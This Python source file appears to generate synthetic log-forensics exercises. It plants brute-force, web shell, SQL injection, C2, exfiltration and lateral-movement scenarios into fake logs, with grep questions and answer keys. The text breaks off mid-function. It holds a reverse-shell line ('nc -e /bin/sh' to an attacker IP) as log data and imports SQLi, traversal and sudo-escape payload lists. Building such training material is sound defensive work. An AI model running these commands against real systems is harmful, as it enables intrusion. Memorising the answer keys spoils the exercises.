"""
The archetype library. Each plant_* function takes (ctx, used_ips) and returns:
{
  "key": str, "title": str, "briefing": str,   # a sentence for briefing.md
  "events": {logname: [(datetime, line), ...]},
  "facts": {...},                               # ground truth, used for progress.md / debugging
  "questions": [ {q, a, cmd, explain, skills:[...]}, ... ],
}
Nothing here is asked to be a decoy by itself -- generate.py decides whether an
archetype's questions get included (decoys are planted but their questions dropped).
"""
import re
from datetime import timedelta
from .pool import (rand_hex, SQLI_PAYLOADS,
                    TRAVERSAL_PAYLOADS, WEBSHELL_PATHS, SUDO_COMMANDS_ABUSE, UA_TOOLING,
                    PHISHING_LURES, LOLBIN_COMMANDS)
from .logfmt import auth_line, access_line, iptables_line, dns_line, exec_line, endpoint_line, syslog_ts


def _sq(s):
    """POSIX single-quote-escape a string for embedding in an f-string `cmd` that's
    itself wrapped in single quotes. Needed for any interpolated value that isn't
    guaranteed quote-free by construction (IPs/hostnames/usernames we generate never
    contain one, but a couple of SUDO_COMMANDS_ABUSE entries do, e.g. the vim/python
    sudo-escape one-liners that legitimately contain '/bin/sh') -- without this, an
    embedded quote silently breaks the shell quoting and the documented cmd stops
    matching anything at all."""
    return "'" + s.replace("'", "'\\''") + "'"


def _burst(ctx, start, count, lo, hi):
    times = []
    t = start
    for _ in range(count):
        t = t + timedelta(seconds=ctx.rng.randint(lo, hi))
        times.append(t)
    return times


def _new_ip(ctx, used):
    ip = ctx.new_attacker_ip(used)
    used.add(ip)
    return ip


# ---------------------------------------------------------------- 1. SSH brute force
def plant_ssh_bruteforce(ctx, used):
    rng = ctx.rng
    attacker = _new_ip(ctx, used)
    target_user = ctx.pick_protagonist_user()
    host = ctx.primary_bastion
    fail_count = rng.randint(90, 260)
    start = ctx.random_ts()
    times = _burst(ctx, start, fail_count, 2, 9)
    events = []
    for t in times:
        pid = rng.randint(1000, 32000)
        port = rng.randint(30000, 60000)
        events.append((t, auth_line(t, host, "sshd", pid, f"Failed password for {target_user} from {attacker} port {port} ssh2")))
    succeeded = rng.random() < 0.6
    if succeeded:
        t = times[-1] + timedelta(seconds=rng.randint(2, 8))
        pid = rng.randint(1000, 32000)
        port = rng.randint(30000, 60000)
        events.append((t, auth_line(t, host, "sshd", pid, f"Accepted password for {target_user} from {attacker} port {port} ssh2")))
        events.append((t, auth_line(t, host, "sshd", pid, f"pam_unix(sshd:session): session opened for user {target_user}(uid=1010) by (uid=0)")))

    facts = dict(attacker=attacker, target_user=target_user, fail_count=fail_count,
                 first_ts=times[0], last_ts=times[-1], succeeded=succeeded, host=host)
    questions = [
        dict(q=f"An SSH brute-force campaign hit `{host}`. What source IP is responsible for it?",
             a=attacker,
             cmd="grep 'Failed password' auth.log | grep -oP '(?<=from )\\S+' | sort | uniq -c | sort -rn | head",
             explain="A lookbehind for 'from ' lets -o print just the source IP regardless of whether the line says "
                     "'invalid user'; ranking those IPs by count surfaces the brute-forcer among hundreds of noise lines.",
             skills=["pipeline", "sort|uniq -c"]),
        dict(q=f"How many failed SSH password attempts came from `{attacker}` in auth.log?",
             a=str(fail_count),
             cmd=f"grep -F -w '{attacker}' auth.log | grep -c 'Failed password'",
             explain="-F matches the IP as a literal string so the dots in the address aren't treated as regex wildcards.",
             skills=["-F", "-c"]),
    ]
    return dict(key="ssh_bruteforce", title="SSH brute force",
                briefing=f"Multiple failed SSH logins were reported against `{host}`.",
                events={"auth": events}, facts=facts, questions=questions)


# ---------------------------------------------------------------- 2. Password spraying
def plant_password_spraying(ctx, used):
    rng = ctx.rng
    attacker = _new_ip(ctx, used)
    host = ctx.primary_bastion
    # leave a little headroom in the user pool for other archetypes' single protagonists
    k = min(rng.randint(6, 10), max(3, len(ctx.users) - 3))
    targets = ctx.pick_protagonist_users(k)
    compromised = rng.choice(targets)
    start = ctx.random_ts()
    events = []
    t = start
    for user in targets:
        attempts = rng.randint(1, 2)
        for i in range(attempts):
            t = t + timedelta(seconds=rng.randint(40, 240))
            pid = rng.randint(1000, 32000)
            is_final_success = (user == compromised and i == attempts - 1)
            verb = "Accepted" if is_final_success else "Failed"
            events.append((t, auth_line(t, host, "sshd", pid, f"{verb} password for {user} from {attacker} port {rng.randint(30000,60000)} ssh2")))
    events.sort(key=lambda e: e[0])
    facts = dict(attacker=attacker, targets=targets, compromised=compromised, host=host)
    questions = [
        dict(q="A single external IP made a small number of login attempts against many different "
               "accounts (rather than many attempts on one account) -- a password-spraying pattern. "
               "How many distinct usernames did it target in auth.log?",
             a=str(len(targets)),
             cmd=f"grep -F -w '{attacker}' auth.log | grep -oP '(?<=for )(invalid user )?\\K\\w+(?= from)' | sort -u | wc -l",
             explain="\\K (PCRE-only) drops everything matched so far from the result, so -o prints just the username instead of the whole line.",
             skills=["-P", "-o", "pipeline"]),
        dict(q="Which username did the password-spraying IP eventually succeed against?",
             a=compromised,
             cmd=f"grep -F -w '{attacker}' auth.log | grep 'Accepted password'",
             explain="Filtering the attacker's lines down to only 'Accepted' events shows which account they broke into.",
             skills=["-F", "pipeline"]),
    ]
    return dict(key="password_spraying", title="Password spraying",
                briefing=f"Low-and-slow login attempts across many accounts were seen on `{host}`.",
                events={"auth": events}, facts=facts, questions=questions)


# ---------------------------------------------------------------- 3. Credential stuffing (web)
def plant_credential_stuffing(ctx, used):
    rng = ctx.rng
    ips = [_new_ip(ctx, used) for _ in range(rng.randint(6, 14))]
    # never collide with ctx.canary_scanner_ua -- the generic -F question already plants that
    # UA into ordinary noise traffic, and if the two matched, a noise hit on POST /login would
    # silently inflate this count.
    ua_choices = [u for u in UA_TOOLING if u != ctx.canary_scanner_ua]
    ua = "python-requests/2.31.0" if "python-requests/2.31.0" in ua_choices else rng.choice(ua_choices)
    events = []
    start = ctx.random_ts()
    total = 0
    success_ip = rng.choice(ips)
    success_t = None
    for ip in ips:
        n = rng.randint(15, 45)
        for i in range(n):
            t = start + timedelta(seconds=rng.randint(0, 3600 * 6))
            is_success = (ip == success_ip and i == n - 1)
            status = 200 if is_success else 401
            size = 512 if is_success else 97
            events.append((t, access_line(t, ip, "POST", "/login", "HTTP/1.1", status, size, "-", ua)))
            if is_success:
                success_t = t
            total += 1
    facts = dict(ips=ips, ua=ua, total=total, success_ip=success_ip, success_t=success_t)
    questions = [
        dict(q=f"Many source IPs POSTed to /login using the exact same automation client "
               f"(`{ua}`), trying stolen credential pairs -- credential stuffing. "
               "How many unique IPs used that literal User-Agent against /login?",
             a=str(len(ips)),
             cmd=f"grep -F 'POST /login' access.log | grep -F '{ua}' | awk '{{print $1}}' | sort -u | wc -l",
             explain="-F is used twice because both the path and the User-Agent string contain '/' and '.' which grep would otherwise treat as regex metacharacters.",
             skills=["-F", "pipeline"]),
        dict(q="Among that credential-stuffing wave specifically, which single IP eventually got a 200 "
               "response on /login? (Ordinary legitimate traffic gets 200 on /login constantly, so "
               "filtering on status alone won't isolate it -- narrow to the wave's traffic first.)",
             a=success_ip,
             cmd=f"grep -F 'POST /login' access.log | grep -F '{ua}' | grep -w 200",
             explain="Filtering to the credential-stuffing wave's own User-Agent first (as in the previous "
                     "question) excludes ordinary successful logins, which also return 200 on /login and "
                     "would otherwise swamp a plain status-code filter; -w then isolates the 200 status field.",
             skills=["-F", "-w", "pipeline"]),
    ]
    return dict(key="credential_stuffing", title="Credential stuffing",
                briefing="A wave of automated login POSTs hit the /login endpoint from many different IPs.",
                events={"access": events}, facts=facts, questions=questions)


# ---------------------------------------------------------------- 4. Web shell upload
def plant_web_shell_upload(ctx, used):
    rng = ctx.rng
    attacker = _new_ip(ctx, used)
    shell_path = rng.choice(WEBSHELL_PATHS)
    host = rng.choice(ctx.hosts["web"])
    start = ctx.random_ts()
    events_access = []
    upload_t = start
    events_access.append((upload_t, access_line(upload_t, attacker, "POST", "/uploads/", "HTTP/1.1", 200, 412, "-", rng.choice(UA_TOOLING))))
    n_access = rng.randint(8, 30)
    for i in range(n_access):
        t = upload_t + timedelta(seconds=rng.randint(30, 6000) * (i + 1) // max(n_access, 1) + rng.randint(1, 30))
        events_access.append((t, access_line(t, attacker, "GET", shell_path + "?cmd=whoami", "HTTP/1.1", 200, rng.randint(20, 300), "-", rng.choice(UA_TOOLING))))
    reverse_port = rng.randint(4000, 9999)
    reverse_t = upload_t + timedelta(seconds=45)
    exec_events = [
        (reverse_t, exec_line(reverse_t, host, 33, "www-data",
         "/bin/sh", f"/bin/sh -c nc -e /bin/sh {attacker} {reverse_port}", rng.randint(1000, 32000)))
    ]
    # the actual network callback the exec.log command triggered -- a separate, independent
    # log source that either confirms or contradicts what exec.log claims happened
    host_ip = ctx.host_ips[host]
    firewall_events = [
        (reverse_t + timedelta(seconds=1), iptables_line(
            reverse_t + timedelta(seconds=1), ctx.primary_fw, "ACCEPT", "eth0", "eth0",
            ":".join(f"{rng.randint(0,255):02x}" for _ in range(6)), host_ip, attacker, "TCP",
            rng.randint(1024, 65000), reverse_port, "SYN", rng.randint(10000, 99999)))
    ]
    facts = dict(attacker=attacker, shell_path=shell_path, upload_t=upload_t, reverse_port=reverse_port, host=host)
    questions = [
        dict(q=f"A web shell was uploaded and then repeatedly accessed on `{host}`. What is its exact path?",
             a=shell_path,
             cmd=r"grep -oP 'GET \K[^?\s]+(?=\?cmd=)' access.log | sort -u",
             explain="\\K resets the match start after 'GET ' and the lookahead stops it right before the "
                     "'?cmd=' query string, so -o prints just the repeatedly-hit shell path.",
             skills=["-P", "-o"]),
        dict(q="The compromised web process spawned a reverse shell. What destination port did it connect out to?",
             a=str(reverse_port),
             cmd="grep -F 'www-data' exec.log | grep -oP 'nc -e /bin/sh \\S+ \\K\\d+'",
             explain="\\K (not a lookbehind) drops everything matched so far, including the variable-length "
                     "attacker IP -- a true lookbehind here would fail since PCRE lookbehind must be fixed-length.",
             skills=["-P", "-o"]),
        dict(q=f"exec.log shows the shell process *attempting* that callback -- it doesn't prove the network "
               f"connection actually happened. Corroborate it in firewall.log: what destination port does "
               f"`{host}` actually show an outbound connection to, and does it match the port from exec.log?",
             a=str(reverse_port),
             cmd=f"grep -F -w '{host_ip}' firewall.log | grep -F -w '{attacker}' | grep -oP 'DPT=\\K\\d+'",
             explain="exec.log only proves a process ran a command; firewall.log independently proves a packet "
                     "actually left the host. Matching the port in both is what turns 'the process tried to' "
                     "into 'the connection succeeded'.",
             skills=["-F", "-o", "-w", "pipeline"]),
    ]
    return dict(key="web_shell_upload", title="Web shell upload",
                briefing=f"An upload endpoint on `{host}` was abused to plant a persistent web shell.",
                events={"access": events_access, "exec": exec_events, "firewall": firewall_events},
                facts=facts, questions=questions)


# ---------------------------------------------------------------- 5. SQL injection probing
def plant_sql_injection(ctx, used):
    rng = ctx.rng
    attacker = _new_ip(ctx, used)
    endpoint = rng.choice(["/products/catalog", "/search", "/api/v1/orders"])
    start = ctx.random_ts()
    events = []
    n = rng.randint(40, 140)
    winner = rng.choice(SQLI_PAYLOADS)
    for i in range(n):
        t = start + timedelta(seconds=i * rng.randint(3, 12))
        payload = rng.choice(SQLI_PAYLOADS)
        is_winner = (payload == winner and i == n - 1)
        status = 200 if is_winner else rng.choice([200, 500, 403])
        size = 48000 if is_winner else rng.randint(150, 900)
        events.append((t, access_line(t, attacker, "GET", f"{endpoint}?{payload}", "HTTP/1.1", status, size, "-", rng.choice(UA_TOOLING))))
    facts = dict(attacker=attacker, endpoint=endpoint, n=n, winner=winner)
    questions = [
        dict(q=f"A source IP hammered `{endpoint}` with SQL injection payloads. How many total requests did it send to that path?",
             a=str(n),
             cmd=f"grep -F -w '{attacker}' access.log | grep -F -c '{endpoint}'",
             explain="-F treats the endpoint path as a literal string so the '/' characters aren't parsed as regex.",
             skills=["-F", "-c"]),
        dict(q="Using a case-insensitive PCRE match for the UNION/SELECT pattern, how many of the attacker's "
               "requests contain a UNION...SELECT injection attempt?",
             a=str(sum(1 for _, l in events if re.search(r'union\b.*select', l, re.I))),
             cmd=f"grep -F -w '{attacker}' access.log | grep -ciP 'union\\b.*select'",
             explain="-i folds case (UNION/union/Union) and -P allows the free-form regex; -c counts matching lines.",
             skills=["-P", "-i", "-c"]),
    ]
    return dict(key="sql_injection_probing", title="SQL injection probing",
                briefing=f"Suspicious SQL-flavored query strings were seen against `{endpoint}`.",
                events={"access": events}, facts=facts, questions=questions)


# ---------------------------------------------------------------- 6. Directory traversal
def plant_directory_traversal(ctx, used):
    rng = ctx.rng
    attacker = _new_ip(ctx, used)
    start = ctx.random_ts()
    events = []
    n = rng.randint(30, 90)
    success_t = None
    for i in range(n):
        t = start + timedelta(seconds=i * rng.randint(2, 15))
        payload = rng.choice(TRAVERSAL_PAYLOADS)
        is_success = (i == n - 1)
        status = 200 if is_success else rng.choice([400, 403, 404])
        if is_success:
            success_t = t
        # size is never exactly 200 -- Q2 below greps for the status code 200 as a
        # whole word, and a byte-size that happened to land on 200 would make that
        # match a second (wrong) line too.
        size = rng.randint(100, 2200)
        if size == 200:
            size += 1
        events.append((t, access_line(t, attacker, "GET", payload, "HTTP/1.1", status, size, "-", rng.choice(UA_TOOLING))))
    facts = dict(attacker=attacker, n=n, success_t=success_t)
    questions = [
        dict(q="Directory traversal payloads (../.. and URL-encoded variants) were attempted against the "
               "web server. How many such requests came from the responsible IP?",
             a=str(n),
             cmd=f"grep -P '(\\.\\.(%2f|/)){{2,}}' access.log -i | grep -F -w '{attacker}' | wc -l",
             explain="-P with alternation and a {2,} repeat count matches both the literal and %2f-encoded traversal sequences in one pattern.",
             skills=["-P", "-i", "pipeline"]),
        dict(q="At what timestamp (HH:MM:SS) did the traversal attempt that returned HTTP 200 occur?",
             a=success_t.strftime("%H:%M:%S") if success_t else "n/a",
             cmd=f"grep -F -w '{attacker}' access.log | grep -w 200",
             explain="-w matches the status code 200 as a whole field, avoiding accidental matches inside byte-count or timestamp fields.",
             skills=["-w", "-F"]),
    ]
    return dict(key="directory_traversal", title="Directory traversal",
                briefing="Path-traversal style requests were logged against the web server.",
                events={"access": events}, facts=facts, questions=questions)


# ---------------------------------------------------------------- 7. DNS tunneling
def plant_dns_tunneling(ctx, used):
    rng = ctx.rng
    client = ctx.unique_internal_ip()
    tunnel_domain = f"{rng.choice(['sync', 'relay', 'cdn-edge', 'update'])}-{rand_hex(rng, 4)}.{rng.choice(['datastream-info.net', 'cloud-mirror.io', 'edge-relay.co'])}"
    start = ctx.random_ts()
    n = rng.randint(150, 500)
    events = []
    for i in range(n):
        t = start + timedelta(seconds=i * rng.randint(1, 4))
        chunk = rand_hex(rng, rng.choice([32, 40, 48]))
        qname = f"{chunk}.{tunnel_domain}"
        events.append((t, dns_line(t, ctx.primary_dns, client, rng.randint(1024, 65000), qname, "TXT", "127.0.0.1")))
    facts = dict(client=client, tunnel_domain=tunnel_domain, n=n)
    questions = [
        dict(q="One internal host is issuing an abnormal volume of TXT queries with long hex subdomains "
               "to a single external domain -- likely DNS tunneling. Which internal IP is doing this?",
             a=client,
             cmd="grep 'IN TXT' dns.log | grep -oP 'client \\K[0-9.]+' | sort | uniq -c | sort -rn | head",
             explain="\\K drops the 'client ' label from the match so -o prints just the IP; ranking by TXT-query volume isolates the tunneling host from ordinary DNS chatter.",
             skills=["-P", "-o", "pipeline"]),
        dict(q=f"What is the exact domain suffix the tunnel subdomains are chained under?",
             a=tunnel_domain,
             cmd=f"grep -F -w '{client}' dns.log | grep -oP '[0-9a-f]{{32,48}}\\.\\K\\S+' | sort -u | head -1",
             explain="\\K (not a lookbehind -- PCRE lookbehind must be fixed-length, and this hex chunk isn't) "
                     "discards the encoded chunk and its dot once matched, leaving -o to print only the domain suffix.",
             skills=["-P", "-o"]),
        dict(q="How many tunneling queries were sent in total?",
             a=str(n),
             cmd=f"grep -F '{tunnel_domain}' dns.log | wc -l",
             explain="-F avoids treating the dashes and dots in the domain name as regex syntax.",
             skills=["-F", "-c"]),
    ]
    return dict(key="dns_tunneling", title="DNS tunneling",
                briefing="An internal host is generating a heavy stream of unusual TXT DNS queries.",
                events={"dns": events}, facts=facts, questions=questions)


# ---------------------------------------------------------------- 8. DGA beaconing
def plant_dga_beaconing(ctx, used):
    rng = ctx.rng
    client = ctx.unique_internal_ip()
    tld = rng.choice(["top", "xyz", "info"])
    start = ctx.random_ts()
    n = rng.randint(60, 180)
    events = []
    domains = set()
    for i in range(n):
        t = start + timedelta(seconds=i * rng.randint(200, 900))
        dom = f"{rand_hex(rng, rng.randint(10, 16))}.{tld}"
        domains.add(dom)
        events.append((t, dns_line(t, ctx.primary_dns, client, rng.randint(1024, 65000), dom, "A", "0.0.0.0")))
    facts = dict(client=client, tld=tld, n=n, distinct=len(domains))
    questions = [
        dict(q=f"An internal host is repeatedly querying short, random-looking hostnames all under the "
               f"same rare TLD (.{tld}) -- consistent with a DGA (domain generation algorithm). "
               "Which internal IP is generating these queries?",
             a=client,
             cmd=f"grep -P '\\b[a-f0-9]{{10,16}}\\.{tld}\\b' dns.log | grep -oP 'client \\K[0-9.]+' | sort -u",
             explain="\\b word boundaries plus a length-bounded hex class isolate DGA-shaped names first; \\K then strips the 'client ' label to print just the IP.",
             skills=["-P", "-o", "pipeline"]),
        dict(q="How many distinct DGA-style domain names were queried?",
             a=str(len(domains)),
             cmd=f"grep -P '\\b[a-f0-9]{{10,16}}\\.{tld}\\b' dns.log | grep -oP '[a-f0-9]{{10,16}}\\.{tld}' | sort -u | wc -l",
             explain="-o prints only the matched hostname (not the whole log line) so sort -u can count distinct domains.",
             skills=["-P", "-o", "pipeline"]),
    ]
    return dict(key="dga_beaconing", title="DGA beaconing",
                briefing="Repeated queries to short, random-looking domains under an unusual TLD were observed.",
                events={"dns": events}, facts=facts, questions=questions)


# ---------------------------------------------------------------- 9. C2 beaconing at regular interval
def plant_c2_beaconing(ctx, used):
    rng = ctx.rng
    infected = ctx.unique_internal_ip()
    c2_ip = _new_ip(ctx, used)
    c2_domain = (f"{rng.choice(['cdn-sync', 'static-assets', 'edge-metrics', 'api-telemetry'])}-"
                 f"{rand_hex(rng, 3)}.{rng.choice(['datastream-info.net', 'cloud-mirror.io', 'edge-relay.co'])}")
    interval = rng.choice([30, 60, 90, 120, 300])
    n = rng.randint(80, 200)
    # the answer-key command diffs consecutive timestamps using day-of-month (no year in
    # these logs), which breaks across a calendar month boundary (day resets from e.g. 31
    # to 1) -- reroll the start time until the whole beacon span fits inside one month
    for _ in range(50):
        start = ctx.random_ts()
        end_t = start + timedelta(seconds=(n - 1) * interval)
        if (start.year, start.month) == (end_t.year, end_t.month):
            break
    events = []
    dport = rng.choice([443, 8443, 4444])

    # a handful of DNS lookups for the C2 domain just before the beacon starts -- the
    # "server" slot of dns_line normally carries the resolving server's own address, but
    # here it's repurposed to carry the ANSWER the resolver returned, so the domain can be
    # tied to c2_ip independently of the firewall log (see Q4 below).
    dns_events = []
    n_lookups = rng.randint(2, 5)
    for i in range(n_lookups):
        t = start - timedelta(seconds=(n_lookups - i) * rng.randint(20, 90))
        dns_events.append((t, dns_line(t, ctx.primary_dns, infected, rng.randint(1024, 65000),
                                        c2_domain, "A", c2_ip)))

    for i in range(n):
        t = start + timedelta(seconds=i * interval)
        ident = rng.randint(10000, 99999)
        mac = ":".join(f"{rng.randint(0,255):02x}" for _ in range(6))
        events.append((t, iptables_line(t, ctx.primary_fw, "ACCEPT", "eth0", "eth0", mac, infected, c2_ip, "TCP",
                                         rng.randint(1024, 65000), dport, "SYN", ident)))
    facts = dict(infected=infected, c2_ip=c2_ip, c2_domain=c2_domain, interval=interval, n=n)
    questions = [
        dict(q=f"An internal host is repeatedly connecting out to a single external IP at what looks like a "
               "fixed interval -- classic C2 beaconing. What is that external IP?",
             a=c2_ip,
             cmd=f"grep -F -w '{infected}' firewall.log | grep ACCEPT | grep -oP 'DST=\\K\\S+' | sort | uniq -c | sort -rn | head -1",
             explain="\\K strips the 'DST=' label so -o prints just the destination IP; counting per destination highlights the one receiving disproportionately many outbound connections.",
             skills=["-P", "-o", "pipeline"]),
        dict(q="What is the beacon interval, in seconds, between consecutive connections to that IP?",
             a=str(interval),
             cmd=f"grep -F -w '{c2_ip}' firewall.log | awk '{{split($3,t,\":\"); s=$2*86400+t[1]*3600+t[2]*60+t[3]; "
                 f"if (prev!=\"\") print s-prev; prev=s}}' | sort -u",
             explain="grep isolates just the beacon lines; awk folds day-of-month into the seconds count (so a "
                     "midnight rollover doesn't wrap the clock) and diffs consecutive rows to reveal the fixed cadence.",
             skills=["-F", "pipeline"]),
        dict(q="How many beacon connections total were made to the C2 IP?",
             a=str(n),
             cmd=f"grep -c -F -w '{c2_ip}' firewall.log",
             explain="-F -c counts literal matches of the IP without dots being treated as regex wildcards.",
             skills=["-F", "-c"]),
        dict(q="Corroborate the beacon with a second, independent source: just before the beaconing started, "
               "what domain did the infected host resolve in dns.log -- and does the IP it resolved to match "
               "the beacon destination you found in firewall.log? (Don't just trust one log file; confirm the "
               "same C2 infrastructure shows up in both.)",
             a=c2_domain,
             cmd=f"grep -F -w '{infected}' dns.log",
             explain="Two unrelated log sources (DNS resolution and firewall connections) independently pointing "
                     "at the same infrastructure is much stronger evidence than either alone -- this is the "
                     "corroboration step a real investigation can't skip before calling something confirmed C2.",
             skills=["-F", "pipeline"]),
    ]
    return dict(key="c2_beaconing", title="C2 beaconing",
                briefing="An internal host shows a suspiciously periodic pattern of outbound connections.",
                events={"firewall": events, "dns": dns_events}, facts=facts, questions=questions)


# ---------------------------------------------------------------- 10. Data exfiltration via large responses
def plant_data_exfil(ctx, used):
    rng = ctx.rng
    exfil_ip = ctx.unique_internal_ip() if rng.random() < 0.5 else _new_ip(ctx, used)
    path = ctx.pick_exfil_path()
    start = ctx.random_ts().replace(hour=rng.choice([1, 2, 3, 23]))
    events = []
    n = rng.randint(3, 7)
    total = 0
    for i in range(n):
        t = start + timedelta(minutes=i * rng.randint(2, 8))
        size = rng.randint(40_000_000, 180_000_000)
        total += size
        events.append((t, access_line(t, exfil_ip, "GET", path, "HTTP/1.1", 200, size, "-", rng.choice(UA_TOOLING))))
    facts = dict(exfil_ip=exfil_ip, path=path, n=n, total=total, ts=start)
    questions = [
        dict(q=f"A handful of after-hours requests to `{path}` transferred an unusually large amount of data. "
               "What IP made those requests?",
             a=exfil_ip,
             cmd=f"grep -F '{path}' access.log | "
                 f"awk -F'\"' '{{split($1,ip,\" \"); split($3,sz,\" \"); if (sz[2]+0 > 10000000) print ip[1]}}' | sort -u",
             explain="-F matches the literal path; awk then splits on the quote characters (robust against the "
                     "User-Agent field's variable word count) to pull out the IP and byte-size cleanly before filtering on size.",
             skills=["-F", "pipeline"]),
        dict(q="What is the total number of bytes transferred across all of that IP's requests to the endpoint?",
             a=str(total),
             cmd=f"grep -F -w '{exfil_ip}' access.log | grep -F '{path}' | "
                 f"awk -F'\"' '{{split($3,sz,\" \"); sum+=sz[2]}} END {{print sum}}'",
             explain="Chaining two -F filters isolates just the exfil requests before the quote-delimited awk split sums the byte-count field.",
             skills=["-F", "pipeline"]),
    ]
    return dict(key="data_exfiltration", title="Data exfiltration",
                briefing=f"A small number of abnormally large after-hours transfers hit `{path}`.",
                events={"access": events}, facts=facts, questions=questions)


# ---------------------------------------------------------------- 11. Privilege escalation via sudo abuse
def plant_priv_esc(ctx, used):
    rng = ctx.rng
    user = ctx.pick_protagonist_user()
    host = rng.choice(ctx.hosts["app"] + ctx.hosts["web"])
    start = ctx.random_ts()
    events_auth = []
    n_wrong = rng.randint(2, 5)
    for i in range(n_wrong):
        t = start + timedelta(seconds=i * 20)
        events_auth.append((t, auth_line(t, host, "sudo", rng.randint(1000, 32000), f"{user} : {n_wrong - i} incorrect password attempt ; TTY=pts/1 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash")))
    abuse_cmd = rng.choice(SUDO_COMMANDS_ABUSE)
    t = start + timedelta(seconds=n_wrong * 20 + 15)
    events_auth.append((t, auth_line(t, host, "sudo", rng.randint(1000, 32000), f"{user} : TTY=pts/1 ; PWD=/home/{user} ; USER=root ; COMMAND={abuse_cmd}")))
    exec_pid = rng.randint(1000, 32000)
    exec_events = [(t + timedelta(seconds=2), exec_line(t + timedelta(seconds=2), host, 0, "root", "/bin/bash", abuse_cmd, exec_pid))]
    facts = dict(user=user, host=host, abuse_cmd=abuse_cmd, n_wrong=n_wrong, ts=t, exec_pid=exec_pid)
    questions = [
        dict(q=f"A user on `{host}` mistyped their sudo password a few times before running a suspicious "
               "privileged command. Which user was it?",
             a=user,
             cmd="grep 'incorrect password attempt' auth.log -A3 | grep COMMAND",
             explain="-A3 shows the lines right after each failed sudo attempt, revealing what command finally ran.",
             skills=["-A", "pipeline"]),
        dict(q="What exact command did they run as root right after?",
             a=abuse_cmd,
             cmd=f"grep -F -w '{user}' auth.log | grep -F 'USER=root' | tail -1",
             explain="-F is needed because the command line itself may contain parentheses/quotes that are regex metacharacters.",
             skills=["-F", "pipeline"]),
        dict(q="auth.log only proves sudo *granted* that command -- it doesn't prove the command actually ran. "
               "Corroborate it in exec.log: what PID did that command execute under?",
             a=str(exec_pid),
             cmd=f"grep -F -w '{host}' exec.log | grep -F {_sq(abuse_cmd)}",
             explain="A grant in auth.log and an EXECVE record in exec.log are two independent subsystems "
                     "logging the same moment -- finding the matching PID in exec.log is what confirms the "
                     "privileged command didn't just get approved, it ran.",
             skills=["-F", "-w", "pipeline"]),
    ]
    return dict(key="priv_esc_sudo", title="Privilege escalation via sudo abuse",
                briefing=f"A sudo session on `{host}` shows failed attempts followed by a high-risk command.",
                events={"auth": events_auth, "exec": exec_events}, facts=facts, questions=questions)


# ---------------------------------------------------------------- 12. Lateral movement
def plant_lateral_movement(ctx, used):
    rng = ctx.rng
    user = ctx.pick_protagonist_user()
    pivot_ip = ctx.user_ips[user]
    targets = rng.sample(ctx.hosts["db"] + ctx.hosts["app"], k=min(3, len(ctx.hosts["db"] + ctx.hosts["app"])))
    start = ctx.random_ts()
    events = []
    firewall_events = []
    for i, host in enumerate(targets):
        t = start + timedelta(minutes=i * rng.randint(2, 6))
        events.append((t, auth_line(t, host, "sshd", rng.randint(1000, 32000), f"Accepted password for {user} from {pivot_ip} port {rng.randint(30000,60000)} ssh2")))
        # the network-layer connection backing that login -- an independent source that
        # either confirms or contradicts what the auth.log entry alone claims
        conn_t = t - timedelta(seconds=rng.randint(1, 3))
        firewall_events.append((conn_t, iptables_line(
            conn_t, ctx.primary_fw, "ACCEPT", "eth0", "eth0",
            ":".join(f"{rng.randint(0,255):02x}" for _ in range(6)), pivot_ip, ctx.host_ips[host], "TCP",
            rng.randint(1024, 65000), 22, "SYN", rng.randint(10000, 99999))))
    # deeper analysis: what actually fired off those SSH sessions on the origin
    # workstation, rather than a human typing each login by hand
    workstation = ctx.user_workstation[user]
    script_t = start - timedelta(seconds=rng.randint(30, 120))
    script_cmd = ("powershell.exe -Command \"foreach($h in @('" + "','".join(targets) +
                  "')){ssh " + user + "@$h whoami}\"")
    endpoint_events = [(script_t, endpoint_line(script_t, workstation, user, rng.randint(9001, 32000),
                        rng.randint(1000, 9000), "powershell.exe", "explorer.exe", script_cmd))]

    facts = dict(user=user, pivot_ip=pivot_ip, targets=targets, workstation=workstation)
    questions = [
        dict(q=f"After an initial compromise, account `{user}` was seen SSHing into several internal hosts "
               "in quick succession. Into how many distinct hosts did it successfully log in?",
             a=str(len(targets)),
             cmd=f"grep -F -w '{user}' auth.log | grep 'Accepted password' | awk '{{print $4}}' | sort -u | wc -l",
             explain="Field 4 of this syslog format is the hostname; deduplicating it counts distinct machines touched.",
             skills=["-F", "pipeline"]),
        dict(q="From which internal IP did the lateral movement originate?",
             a=pivot_ip,
             cmd=f"grep -F -w '{user}' auth.log | grep 'Accepted password' | grep -oP '(?<=from )\\S+'",
             explain="A lookbehind for 'from ' lets -o print just the source IP token that follows it.",
             skills=["-P", "-o"]),
        dict(q="auth.log alone only proves an application-level login was accepted -- it doesn't prove a real "
               "network connection carried it. Corroborate independently in firewall.log: how many distinct "
               "internal destination IPs received an ACCEPTed port-22 connection from that same source IP?",
             a=str(len(targets)),
             cmd=f"grep -F -w '{pivot_ip}' firewall.log | grep -F 'DPT=22' | grep -oP 'DST=\\K\\S+' | sort -u | wc -l",
             explain="Getting the same count of distinct hosts from firewall.log's connection records as from "
                     "auth.log's login records -- two unrelated logging subsystems -- is what makes the finding "
                     "solid instead of resting on a single log source.",
             skills=["-F", "-o", "pipeline"]),
        dict(q="One more source to check on the ORIGIN workstation itself: what process in endpoint.log fired "
               "off all those SSH sessions in one shot -- a strong sign this was scripted, not a human typing "
               "each login by hand?",
             a="powershell.exe",
             cmd=f"grep -F -w '{workstation}' endpoint.log | grep -F 'ssh'",
             explain="A single process launching all the connections back-to-back (instead of several separate "
                     "interactive terminal sessions) is exactly the kind of detail endpoint.log surfaces that "
                     "auth.log and firewall.log alone can't -- it points at automation, not a person driving "
                     "each hop by hand.",
             skills=["-F", "-w"]),
    ]
    return dict(key="lateral_movement", title="Lateral movement",
                briefing=f"Account `{user}` authenticated into multiple internal hosts in a short window.",
                events={"auth": events, "firewall": firewall_events, "endpoint": endpoint_events},
                facts=facts, questions=questions)


# ---------------------------------------------------------------- 13. Insider after-hours access
def plant_insider_access(ctx, used):
    rng = ctx.rng
    user = ctx.pick_protagonist_user()
    ip = ctx.user_ips[user]
    path = ctx.pick_exfil_path()
    nights = rng.randint(3, 6)
    lookback_days = 14
    chosen_days = rng.sample(range(lookback_days), k=min(nights, lookback_days))
    events = []
    auth_events = []
    anchor = ctx.end
    for d in chosen_days:
        day_dt = anchor - timedelta(days=d)
        t = day_dt.replace(hour=rng.randint(1, 4), minute=rng.randint(0, 59), second=rng.randint(0, 59))
